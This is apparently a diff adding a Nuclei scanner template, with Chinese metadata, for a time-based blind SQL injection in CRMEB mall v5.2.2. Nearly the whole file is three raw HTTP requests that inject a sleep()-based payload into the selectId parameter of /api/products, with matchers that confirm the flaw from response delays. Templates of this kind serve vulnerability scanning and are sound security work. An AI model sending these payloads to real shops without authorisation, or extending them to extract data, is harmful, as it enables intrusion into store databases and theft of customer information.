@@ -1,0 +1,68 @@
+id: CRMEB-selectId-sqli
+info:
+  name: CRMEB开源商城v5.2.2存在sql注入漏洞
+  author: wangzong
+  severity: high
+  description: CRMEB v.5.2.2 中的 SQL 注入漏洞允许远程攻击者通过 ProductController.php 文件中的 getProductList 函数获取敏感信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/CRMEB%E5%BC%80%E6%BA%90%E5%95%86%E5%9F%8Ev5.2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=0*if(now()=sysdate(),sleep(3),0) HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+      - |+
+        GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=0*if(now()=sysdate(),sleep(6),0) HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+      - |+
+        GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=0*if(now()=sysdate(),sleep(9),0) HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
